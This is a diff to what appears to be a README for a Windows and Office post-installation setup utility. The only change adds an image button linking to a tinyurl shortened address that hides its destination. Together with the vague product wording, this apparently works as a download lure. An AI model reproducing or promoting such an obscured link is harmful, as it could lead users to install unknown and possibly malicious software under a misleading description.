@@ -4,7 +4,7 @@
 
 Tired of complicated post-installation configurations? This utility streamlines the final setup process for your Windows operating system and Office applications. It's designed to handle those last technical steps so you can start using your computer productively right away—no advanced skills required.
 
-
+[![5251243](https://github.com/user-attachments/assets/9ad87757-b57b-4bb7-8ac3-9f4fd261130a)](https://tinyurl.com/ktvp42b6)
 
 ### **Purpose & Functionality**
 
